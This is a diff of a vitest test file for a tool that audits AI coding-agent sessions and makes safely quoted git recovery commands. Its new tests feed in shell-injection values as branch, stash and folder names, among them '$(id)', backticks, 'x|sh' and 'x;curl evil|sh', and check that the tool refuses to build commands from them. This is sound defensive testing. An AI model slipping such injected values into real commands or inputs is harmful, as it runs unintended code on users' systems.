@@ -6,14 +6,16 @@
  */
 
 import { execFileSync } from "node:child_process";
-import { existsSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 import { isLocalFix } from "../core/verify/cards.js";
 import { checkGitBacked, GIT_CARD_BUILDERS } from "../core/verify/git-checks.js";
+import { lostWorkCard } from "../core/verify/lost-work.js";
 import type { GitOutcome, VerifyIO } from "../core/verify/types.js";
 import { isAllowedGitCall } from "../verify-io.js";
 import {
+  checkedOf,
   commitLine,
   corpusOf,
   type GitSession,
@@ -91,10 +93,10 @@ describe("every git call is allow-listed", () => {
     expect(new Set(calls.map((c) => c.args[0]))).toEqual(
       new Set(["rev-parse", "log", "for-each-ref", "stash", "ls-files"]),
     );
-    expect(outcome["lost-work"].facts.branches.recoverable).toBe(1);
-    expect(outcome["lost-work"].facts.stashes.recoverable).toBe(1);
-    expect(outcome["skipped-checks"].facts.noVerify.onMain).toBe(1);
-    expect(outcome.destructive.facts.rm.trackedGone).toBe(1);
+    expect(checkedOf(outcome["lost-work"]).facts.branches.recoverable).toBe(1);
+    expect(checkedOf(outcome["lost-work"]).facts.stashes.recoverable).toBe(1);
+    expect(checkedOf(outcome["skipped-checks"]).facts.noVerify.onMain).toBe(1);
+    expect(checkedOf(outcome.destructive).facts.rm.trackedGone).toBe(1);
     expect(outcome.localFixes.every(isLocalFix)).toBe(true);
     expect(outcome.localFixes.map((f) => f.category).sort()).toEqual([
       "destructive",
@@ -120,12 +122,161 @@ describe("a repository's own config starts no program", () => {
       git(root, "config", key, value);
     }
     const outcome = await runChecks("claude", sessions, home);
-    expect(outcome.destructive.facts.rm.trackedGone).toBe(1);
+    expect(checkedOf(outcome.destructive).facts.rm.trackedGone).toBe(1);
     expect(existsSync(marker)).toBe(false);
 
     // Negative control: the same listing without the safety flags does start the monitor.
     execFileSync("git", ["ls-files", "--deleted", "-z"], { cwd: root, stdio: "pipe" });
     expect(existsSync(marker)).toBe(true);
+  });
+});
+
+/** A command with every single-quoted argument taken out: what the shell reads as syntax. */
+function outsideQuotes(command: string): string {
+  return command.replace(/'[^']*'/g, "").replace(/\\'/g, "");
+}
+
+/** A repo with a commit no ref holds any more, and that commit's full id. */
+function unreachableCommit(root: string): string {
+  git(root, "switch", "-q", "-c", "topic");
+  commitLine(root, "t.txt", "topic work");
+  const commit = rev(root, "HEAD");
+  git(root, "switch", "-q", "main");
+  git(root, "branch", "-D", "topic");
+  return commit;
+}
+
+describe("recovery commands: every part quoted, and a hostile one left out with a note", () => {
+  it("every exact command is quoted argument by argument", async () => {
+    const home = tempFolder("home");
+    const { sessions } = everything("quoted");
+    const outcome = await runChecks("claude", sessions, home);
+    expect(outcome.localFixes.length).toBe(4);
+    for (const fix of outcome.localFixes) {
+      expect(outsideQuotes(fix.command).trim()).toBe("");
+    }
+    expect(outcome.unsafeFixes).toEqual([]);
+  });
+
+  it.each([
+    "x;curl",
+    "$(id)",
+    "`id`",
+    "a'b",
+    "x|sh",
+  ])("a deleted branch named %s gets no command, and is counted", async (name) => {
+    const home = tempFolder("home");
+    const root = makeRepo("hostile-branch");
+    const commit = unreachableCommit(root);
+    const outcome = await runChecks(
+      "claude",
+      [
+        {
+          cwd: root,
+          events: [
+            {
+              kind: "bash",
+              command: "git branch -D topic",
+              output: `Deleted branch ${name} (was ${commit.slice(0, 7)}).\n`,
+            },
+          ],
+        },
+      ],
+      home,
+    );
+    const lost = checkedOf(outcome["lost-work"]);
+    expect(lost.facts.branches.recoverable).toBe(1);
+    expect(lost.facts.unsafeFixes).toBe(1);
+    expect(outcome.localFixes).toEqual([]);
+    expect(outcome.unsafeFixes).toEqual([
+      { category: "lost-work", unsafe: true, note: "could not make a safe command" },
+    ]);
+    const card = lostWorkCard(lost, { ranEvidence: "tool-result" });
+    expect(card.now.map((s) => s.template)).toContain("lost-work.now.unsafe-fixes");
+    expect(JSON.stringify(card)).not.toContain(name);
+  });
+
+  it("a name with a space is not read as a deleted branch at all", async () => {
+    const home = tempFolder("home");
+    const root = makeRepo("hostile-space");
+    const commit = unreachableCommit(root);
+    const outcome = await runChecks(
+      "claude",
+      [
+        {
+          cwd: root,
+          events: [
+            {
+              kind: "bash",
+              command: "git branch -D topic",
+              output: `Deleted branch x;curl evil|sh (was ${commit.slice(0, 7)}).\n`,
+            },
+            {
+              kind: "bash",
+              command: "git stash drop",
+              output: "Dropped refs/stash@{0} ($(id))\n",
+            },
+          ],
+        },
+      ],
+      home,
+    );
+    const lost = checkedOf(outcome["lost-work"]);
+    expect(lost.facts.branches.notIdentified).toBe(1);
+    expect(lost.facts.stashes.notIdentified).toBe(1);
+    expect(outcome.localFixes).toEqual([]);
+    expect(outcome.unsafeFixes).toEqual([]);
+  });
+
+  it("a repo folder with a hostile name gets no command from any check", async () => {
+    const home = tempFolder("home");
+    const root = join(tempFolder("hostile-parent"), "repo;$(id)`x`|y");
+    mkdirSync(root);
+    git(root, "init", "-q", "-b", "main");
+    mkdirSync(join(root, "src"));
+    writeFileSync(join(root, "src", "a.ts"), "a\n");
+    git(root, "add", "-A");
+    git(root, "commit", "-q", "-m", "first");
+    writeFileSync(join(root, ".git", "hooks", "pre-commit"), "#!/bin/sh\nexit 0\n", {
+      mode: 0o755,
+    });
+    const commit = unreachableCommit(root);
+    const committed = commitLine(root, "c.txt", "skip", ["--no-verify"]);
+    setRemoteBranch(root, "main", rev(root, "HEAD"));
+    rmSync(join(root, "src"), { recursive: true });
+    const outcome = await runChecks(
+      "claude",
+      [
+        {
+          cwd: root,
+          events: [
+            {
+              kind: "bash",
+              command: "git branch -D topic",
+              output: `Deleted branch topic (was ${commit.slice(0, 7)}).\n`,
+            },
+            { kind: "bash", command: `git commit --no-verify -m "skip"`, output: committed },
+            { kind: "bash", command: "rm -rf src", output: "" },
+          ],
+        },
+      ],
+      home,
+    );
+    expect(checkedOf(outcome["lost-work"]).facts.branches.recoverable).toBe(1);
+    expect(checkedOf(outcome["skipped-checks"]).facts.noVerify.onMain).toBe(1);
+    expect(checkedOf(outcome.destructive).facts.rm.trackedGone).toBe(1);
+    expect(outcome.localFixes).toEqual([]);
+    expect(outcome.unsafeFixes.map((f) => f.category).sort()).toEqual([
+      "destructive",
+      "lost-work",
+      "skipped-checks",
+    ]);
+    expect(checkedOf(outcome["lost-work"]).facts.unsafeFixes).toBe(1);
+    expect(checkedOf(outcome["skipped-checks"]).facts.unsafeFixes).toBe(1);
+    expect(checkedOf(outcome.destructive).facts.unsafeFixes).toBe(1);
+    for (const fix of outcome.unsafeFixes) {
+      expect(JSON.stringify(fix)).not.toContain("$(id)");
+    }
   });
 });
 
@@ -181,9 +332,9 @@ describe("a signed commit starts no signature program", () => {
       home,
     );
     // Both lookups ran: the branch's commit was found, and the stash list was read.
-    expect(outcome["lost-work"].facts.branches.recoverable).toBe(1);
-    expect(outcome["lost-work"].facts.stashes.dropped).toBe(1);
-    expect(outcome["lost-work"].facts.stashes.couldNotCheck).toBe(0);
+    expect(checkedOf(outcome["lost-work"]).facts.branches.recoverable).toBe(1);
+    expect(checkedOf(outcome["lost-work"]).facts.stashes.dropped).toBe(1);
+    expect(checkedOf(outcome["lost-work"]).facts.stashes.couldNotCheck).toBe(0);
     expect(existsSync(marker)).toBe(false);
 
     // Negative control: the same lookup without the safety flags does run the program.
